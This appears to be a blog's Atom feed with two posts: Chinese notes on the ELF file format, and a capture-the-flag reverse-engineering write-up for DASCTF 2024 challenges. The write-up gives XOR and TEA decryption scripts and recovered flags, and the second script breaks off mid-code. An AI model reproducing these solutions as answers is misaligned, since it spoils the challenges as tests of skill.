<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2024-07-23T10:46:30.345Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ELF文件结构</title>
    <link href="https://www.pri87.vip/posts/e60119a.html"/>
    <id>https://www.pri87.vip/posts/e60119a.html</id>
    <published>2024-07-21T13:18:13.000Z</published>
    <updated>2024-07-23T10:46:30.345Z</updated>
    
    <content type="html"><![CDATA[<hr><p>无限期停更<br><a href="https://sp4n9x.github.io/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析 | Sp4n9x’s Blog</a></p><p><a href="https://www.cnblogs.com/sky-heaven/p/15863815.html">手拆ELF32（一，文件头）【转】 - Sky&amp;Zhang - 博客园 (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/7317577665015005223">ELF解析01 - ELF头和程序头 - 掘金 (juejin.cn)</a></p><p><a href="https://mudongliang.github.io/2015/05/19/elf-section-header-data-structure.html">ELF Section Header的结构 (mudongliang.github.io)</a></p><p>因为上面几篇讲的太详细了，后面不写了</p><p>其中第三篇为加载时需要关注的点，前两篇都是讲结构特点</p><hr><p>上次了解了windows系统上的PE文件结构，这里在网上总结了一些（抄了一些）内容</p><h2 id="序">序</h2><p>ELF分为大致分为三种：</p><ul><li>可重定位文件(relocatable)：编译器和汇编器产生的.o文件，被Linker所处理</li><li>可执行文件(executable)：Linker对.o文件进行处理输出的文件，进程映像</li><li>共享对象文件(shared object)：<a href="http://xn--5nqw3gs1n2mbb8m.so">动态库文件.so</a></li></ul><p>文件布局大致为：</p><ul><li>ELF header</li><li>program header table（描述段）</li><li>段和区</li><li>section header table（描述区）</li></ul><p>以上的布局只有ELF header在固定位置，其它的位置不定</p><h2 id="ELF-header">ELF header</h2><h3 id="e-ident">e_ident</h3><p><code>Magic Number</code>  7F 45 4C 46</p><p>EI_class：(1字节)</p><ul><li>无效类</li><li>1 32位</li><li>2 64位</li></ul><p>EI_DATA：(1字节)</p><ul><li>0 无效数据编码</li><li>1 小端序</li><li>2 大端序</li></ul><p>EI_VERSION：只有01这个值</p><p>EI_OSABI：操作系统/ABI标识</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ELFOSABI_NONE</td><td style="text-align:center">0</td><td style="text-align:left">No extensions or unspecified</td></tr><tr><td style="text-align:left">ELFOSABI_SYSV</td><td style="text-align:center">0</td><td style="text-align:left">UNIX System V ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HPUX</td><td style="text-align:center">1</td><td style="text-align:left">HP-UX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NETBSD</td><td style="text-align:center">2</td><td style="text-align:left">NetBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_LINUX</td><td style="text-align:center">3</td><td style="text-align:left">Linux ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HURD</td><td style="text-align:center">4</td><td style="text-align:left">GNU Hurd ABI</td></tr><tr><td style="text-align:left">ELFOSABI_SOLARIS</td><td style="text-align:center">6</td><td style="text-align:left">Sun Solaris ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AIX</td><td style="text-align:center">7</td><td style="text-align:left">IBM AIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_IRIX</td><td style="text-align:center">8</td><td style="text-align:left">SGI Irix ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FREEBSD</td><td style="text-align:center">9</td><td style="text-align:left">FreeBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_TRU64</td><td style="text-align:center">10</td><td style="text-align:left">Compaq TRU64 UNIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_MODESTO</td><td style="text-align:center">11</td><td style="text-align:left">Novell Modesto ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENBSD</td><td style="text-align:center">12</td><td style="text-align:left">OpenBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENVMS</td><td style="text-align:center">13</td><td style="text-align:left">OpenVMS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NSK</td><td style="text-align:center">14</td><td style="text-align:left">NonStop Kernel ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AROS</td><td style="text-align:center">15</td><td style="text-align:left">AROS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FENIXOS</td><td style="text-align:center">16</td><td style="text-align:left">Fenix OS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_CLOUDABI</td><td style="text-align:center">17</td><td style="text-align:left">CloudABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM_AEABI</td><td style="text-align:center">64</td><td style="text-align:left">ARM EABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM</td><td style="text-align:center">97</td><td style="text-align:left">ARM ABI</td></tr><tr><td style="text-align:left">ELFOSABI_STANDALONE</td><td style="text-align:center">255</td><td style="text-align:left">Standalone (embedded) application</td></tr></tbody></table><p>EI_ABIVERSION：</p><p>进一步指定ABI版本</p><p>elf pad：填充字节，置0</p><h3 id="E-TYPE">E_TYPE</h3><p>标明文件类型（2字节）</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">ET_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无文件类型</td></tr><tr><td style="text-align:left">ET_REL</td><td style="text-align:center">1</td><td style="text-align:left">可重定位文件</td></tr><tr><td style="text-align:left">ET_EXEC</td><td style="text-align:center">2</td><td style="text-align:left">可执行文件</td></tr><tr><td style="text-align:left">ET_DYN</td><td style="text-align:center">3</td><td style="text-align:left">共享目标文件</td></tr><tr><td style="text-align:left">ET_CORE</td><td style="text-align:center">4</td><td style="text-align:left">核心转储文件</td></tr><tr><td style="text-align:left">ET_NUM</td><td style="text-align:center">5</td><td style="text-align:left">定义的文件类型数量</td></tr><tr><td style="text-align:left">ET_LOOS</td><td style="text-align:center">0xFE00</td><td style="text-align:left">特定操作系统目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIOS</td><td style="text-align:center">0xFEFF</td><td style="text-align:left">特定操作系统目标文件类型值范围的上限</td></tr><tr><td style="text-align:left">ET_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">特定处理器目标文件类型值范围的下限</td></tr><tr><td style="text-align:left">ET_HIPROC</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">特定处理器目标文件类型值范围的上限</td></tr></tbody></table><h3 id="e-machine">e_machine</h3><p>标明处理器架构和指令集（2字节）</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">EM_NONE</td><td style="text-align:center">0</td><td style="text-align:left">无机器类型</td></tr><tr><td style="text-align:left">EM_M32</td><td style="text-align:center">1</td><td style="text-align:left">AT&amp;T WE 32100</td></tr><tr><td style="text-align:left">EM_SPARC</td><td style="text-align:center">2</td><td style="text-align:left">SUN SPARC</td></tr><tr><td style="text-align:left">EM_386</td><td style="text-align:center">3</td><td style="text-align:left">Intel 80386(x86)</td></tr><tr><td style="text-align:left">EM_68K</td><td style="text-align:center">4</td><td style="text-align:left">Motorola 68000(M68k)</td></tr><tr><td style="text-align:left">EM_88K</td><td style="text-align:center">5</td><td style="text-align:left">Motorola 88000(M88k)</td></tr><tr><td style="text-align:left">EM_860</td><td style="text-align:center">7</td><td style="text-align:left">Intel 80860</td></tr><tr><td style="text-align:left">EM_MIPS</td><td style="text-align:center">8</td><td style="text-align:left">MIPS R3000 big-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS3_LE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R3000 little-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS4_BE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R4000 big-endian</td></tr><tr><td style="text-align:left">EM_PPC</td><td style="text-align:center">20</td><td style="text-align:left">PowerPC</td></tr><tr><td style="text-align:left">EM_PPC64</td><td style="text-align:center">21</td><td style="text-align:left">PowerPC 64-bit</td></tr><tr><td style="text-align:left">EM_ARM</td><td style="text-align:center">40</td><td style="text-align:left">ARM 32-bit(up to ARMv7/Aarch32)</td></tr><tr><td style="text-align:left">EM_SPARCV9</td><td style="text-align:center">43</td><td style="text-align:left">SPARC v9 64-bit</td></tr><tr><td style="text-align:left">EM_IA_64</td><td style="text-align:center">50</td><td style="text-align:left">HP/Intel IA-64</td></tr><tr><td style="text-align:left">EM_X86_64</td><td style="text-align:center">62</td><td style="text-align:left">AMD x86-64</td></tr><tr><td style="text-align:left">EM_MSP430</td><td style="text-align:center">105</td><td style="text-align:left">Texas Instruments msp430</td></tr><tr><td style="text-align:left">EM_ALTERA_NIOS2</td><td style="text-align:center">113</td><td style="text-align:left">Altera Nios II</td></tr><tr><td style="text-align:left">EM_AARCH64</td><td style="text-align:center">183</td><td style="text-align:left">ARM 64-bit(ARMv8/Aarch64)</td></tr><tr><td style="text-align:left">EM_AVR32</td><td style="text-align:center">185</td><td style="text-align:left">Amtel 32-bit microprocessor</td></tr><tr><td style="text-align:left">EM_STM8</td><td style="text-align:center">186</td><td style="text-align:left">STMicroelectronics STM8</td></tr><tr><td style="text-align:left">EM_RISCV</td><td style="text-align:center">243</td><td style="text-align:left">RISC-V</td></tr><tr><td style="text-align:left">EM_BPF</td><td style="text-align:center">247</td><td style="text-align:left">Linux BPF – in-kernel virtual machine</td></tr></tbody></table><h3 id="e-version">e_version</h3><p>当前文件版本（四字节）</p><p>0 无版本</p><p>其它 当前版本号</p><h3 id="程序入口">程序入口</h3><p>8字节，标明入口点</p><h3 id="程序头表偏移">程序头表偏移</h3><p>8字节，描述段表在文件中的偏移</p><h3 id="区表偏移">区表偏移</h3><p>8字节，描述区表在文件中的偏移</p><h3 id="e-flag">e_flag</h3><p>处理器指定的与文件相关联的flag(4字节，一般是0)</p><h3 id="ELF-header-大小">ELF_header 大小</h3><p>2字节，指明头大小。一般为0x40</p><h3 id="程序头表大小">程序头表大小</h3><p>2字节，如果没有程序头表，则为0</p><h3 id="程序头内容数量">程序头内容数量</h3><p>2字节，标明程序头表中的内容个数</p><h3 id="节区头表大小">节区头表大小</h3><p>2字节，如果没有节区头表，则为0</p><h3 id="节区头内容数量">节区头内容数量</h3><p>2字节，标明节区头表中的内容个数</p><h3 id="节区头字符表索引">节区头字符表索引</h3><p>2字节，有以下可选值</p><p>/* Special section indices. */</p><p>#define SHN_UNDEF 0 /* Undefined section <em>/<br>#define SHN_LORESERVE 0xff00 /</em> Start of reserved indices <em>/<br>#define SHN_LOPROC 0xff00 /</em> Start of processor-specific <em>/<br>#define SHN_BEFORE 0xff00 /</em> Order section before all others<br>(Solaris). <em>/<br>#define SHN_AFTER 0xff01 /</em> Order section after all others<br>(Solaris). <em>/<br>#define SHN_HIPROC 0xff1f /</em> End of processor-specific <em>/<br>#define SHN_LOOS 0xff20 /</em> Start of OS-specific <em>/<br>#define SHN_HIOS 0xff3f /</em> End of OS-specific <em>/<br>#define SHN_ABS 0xfff1 /</em> Associated symbol is absolute <em>/<br>#define SHN_COMMON 0xfff2 /</em> Associated symbol is common <em>/<br>#define SHN_XINDEX 0xffff /</em> Index is in extra table. <em>/<br>#define SHN_HIRESERVE 0xffff /</em> End of reserved indices */</p><h2 id="program-header-table">program_header_table</h2><p>是一个结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PN_XNUM0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf32_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf32_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf32_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf32_Wordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf32_Wordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf32_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf32_Wordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf64_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf64_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf64_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf64_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf64_Xwordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf64_Xwordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf64_Xwordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="段类型">段类型</h3><p>p_type，四字节</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PT_NULL</td><td style="text-align:center">0</td><td style="text-align:left">该数组元素未使用。除p_type外，其他结构体成员的值都是未定义的。这种类型可以使程序头表(Program Header Table)忽略此条目。</td></tr><tr><td style="text-align:left">PT_LOAD</td><td style="text-align:center">1</td><td style="text-align:left">此类型段为一个可加载的段，大小由p_filesz和p_memsz描述。文件中该段的内容被映射到相应内存段的开始处。如果p_memsz大于p_filesz，“剩余”的字节都要被置为0并跟踪段的初始化区域。p_filesz不能大于p_memsz。可加载的段在程序头表中按照p_vaddr升序排列。</td></tr><tr><td style="text-align:left">PT_DYNAMIC</td><td style="text-align:center">2</td><td style="text-align:left">此类型段给出动态链接信息，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_INTERP</td><td style="text-align:center">3</td><td style="text-align:left">此类型段给出了一个以Null结尾的字符串的位置和长度，该字符串将被当作解释器的路径名进行调用。这种段类型仅对可执行文件有意义(也可能出现在共享目标文件中)。此外，这种段在一个文件中最多出现一次。而且该段类型的数组元素存在的话，它必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_NOTE</td><td style="text-align:center">4</td><td style="text-align:left">此类型段给出附加信息的位置和大小。</td></tr><tr><td style="text-align:left">PT_SHLIB</td><td style="text-align:center">5</td><td style="text-align:left">该段类型被保留，不过语义未指定。而且，包含这种类型数组元素的程序不符合Unix System V的ELF标准，具体参见ELF手册Book III。</td></tr><tr><td style="text-align:left">PT_PHDR</td><td style="text-align:center">6</td><td style="text-align:left">该段类型的数组元素如果存在的话，则给出了程序头表自身在文件和程序内存映像中的的位置和大小。此类型的段在文件中最多出现一次。此外，只有程序头表是程序内存映像的一部分时，该段类型的数组元素才会存在。如果该段类型的数组元素存在，则必须在所有可加载段条目的前面。</td></tr><tr><td style="text-align:left">PT_TLS</td><td style="text-align:center">7</td><td style="text-align:left">该段类型的数组元素给出线程本地存储段(TLS)的信息。</td></tr><tr><td style="text-align:left">PT_LOOS</td><td style="text-align:center">0x60000000</td><td style="text-align:left">特定操作系统段类型值的下限。</td></tr><tr><td style="text-align:left">PT_GNU_EH_FRAME</td><td style="text-align:center">0x6474E550</td><td style="text-align:left">该段类型数组元素指定异常处理信息的位置和大小(由.eh_frame_hdr节定义)[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_STACK</td><td style="text-align:center">0x6474E551</td><td style="text-align:left">该段类型数组元素中的p_flags成员指定包含栈的段的权限，并用于指示栈是否应该是可执行的。没有此段类型的数组元素，则表示该栈将是可执行的[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_RELRO</td><td style="text-align:center">0x6474E552</td><td style="text-align:left">该段类型数组元素指定了一个在重定位后可以被置为只读的段的位置和大小[^5]。</td></tr><tr><td style="text-align:left">PT_GNU_PROPERTY</td><td style="text-align:center">0x6474E553</td><td style="text-align:left">该段类型数组元素指定.note.gnu.property节的位置和大小。</td></tr><tr><td style="text-align:left">PT_HIOS</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">特定操作系统段类型值的上限。</td></tr><tr><td style="text-align:left">PT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:left">特定处理器段类型值的下限。</td></tr><tr><td style="text-align:left">PT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:left">特定处理器段类型值的上限。</td></tr></tbody></table><h3 id="段权限">段权限</h3><p>p_flags，四字节</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">PF_X</td><td style="text-align:center">0x1</td><td style="text-align:left">段具有可执行权限</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">0x2</td><td style="text-align:left">段具有写权限</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">0x4</td><td style="text-align:left">段具有读权限</td></tr><tr><td style="text-align:left">PF_MASKOS</td><td style="text-align:center">0x0FF00000</td><td style="text-align:left">为特定操作系统预留</td></tr><tr><td style="text-align:left">PF_MASKPROC</td><td style="text-align:center">0xF0000000</td><td style="text-align:left">为特定处理器预留</td></tr></tbody></table><p>如果是0，表明拒绝访问<br>以上权限可组合，且一般情况，段没有写权限</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">准确的权限</th><th style="text-align:left">允许的权限</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:center">0</td><td style="text-align:left">拒绝所有访问</td><td style="text-align:left">拒绝所有访问</td></tr><tr><td style="text-align:left">PF_X</td><td style="text-align:center">1</td><td style="text-align:left">只执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">2</td><td style="text-align:left">只写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_W + PF_X</td><td style="text-align:center">3</td><td style="text-align:left">写，执行</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">4</td><td style="text-align:left">只读</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_X</td><td style="text-align:center">5</td><td style="text-align:left">读，执行</td><td style="text-align:left">读，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W</td><td style="text-align:center">6</td><td style="text-align:left">读，写</td><td style="text-align:left">读，写，执行</td></tr><tr><td style="text-align:left">PF_R + PF_W + PF_X</td><td style="text-align:center">7</td><td style="text-align:left">读，写，执行</td><td style="text-align:left">读，写，执行</td></tr></tbody></table><h3 id="段内容">段内容</h3><p>Segment Contents标明了一个段的多种节的类型</p><h3 id="段偏移">段偏移</h3><p>在文件中的偏移，8字节</p><h3 id="段虚拟地址">段虚拟地址</h3><p>表示加载后的相对偏移。真实地址=虚拟地址基址+段虚拟地址，8字节</p><h3 id="段物理地址">段物理地址</h3><p>不知道作用，可能是在虚拟内存中的地址。8字节</p><h3 id="段文件长度">段文件长度</h3><p>段在文件中的长度，8字节</p><h3 id="段虚拟长度">段虚拟长度</h3><p>段在内存中的长度，8字节</p><h3 id="段对齐方式">段对齐方式</h3><p>8字节，一般为4096</p><hr><p>参考：</p><p><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-35342.html">ELF 标识 - 链接程序和库指南 (oracle.com)</a></p><hr>]]></content>
    
    
    <summary type="html">全是抄的</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="PE文件结构" scheme="https://www.pri87.vip/tags/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
    <category term="ELF" scheme="https://www.pri87.vip/tags/ELF/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2024summer-RE</title>
    <link href="https://www.pri87.vip/posts/b7df16dd.html"/>
    <id>https://www.pri87.vip/posts/b7df16dd.html</id>
    <published>2024-07-21T09:42:35.000Z</published>
    <updated>2024-07-22T05:34:29.629Z</updated>
    
    <content type="html"><![CDATA[<p>第一次遇到DCT，QAQ，终究还是被暴打了</p><h2 id="DosSnake">DosSnake</h2><p>考察16位汇编，大概打开看看，是一个贪吃蛇，按照游戏题的惯例，应当是胜利后自动输出flag</p><p>看一下有没有相关函数或者字符串</p><p>查字符串可以看到有DASCTF，然后交叉引用</p><p>大概是这样：</p><p><img src="https://s2.loli.net/2024/07/21/FtOvZPhXBp6o82c.png" alt="image-20240721174647593"></p><p>可以看到用（di）dasctf和（si）后面的位数依次异或，一轮后重置di</p><p>直接写脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from prism import *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x3C</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>]</span><br><span class="line">c = [<span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>]</span><br><span class="line"><span class="keyword">pxor</span>(a,c)</span><br><span class="line"># DASCTF&#123;H0wfUnnytheDosSnakeis!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Strangeprograme">Strangeprograme</h2><p>常规TEA，不多说</p><p>反调，附加调试进入主要判断逻辑</p><p>加密是一样的，区别是只加密第一组数据，然后异或后面的数据</p><p>直接写脚本解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">v4 += (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v3 -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> sum; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">v4 -= (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (sum + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v5 -= (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (sum + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">10</span>] = &#123;</span><br><span class="line"><span class="number">0xBC2B4DF9</span>, <span class="number">0x6213DD13</span>, <span class="number">0x89FFFCC9</span>, <span class="number">0x0FC94F7D</span>, <span class="number">0x526D1D63</span>, <span class="number">0xE341FD50</span>, <span class="number">0x97287633</span>, <span class="number">0x6BF93638</span>,</span><br><span class="line"><span class="number">0x83143990</span>, <span class="number">0x1F2CE22C</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x12345678</span>, <span 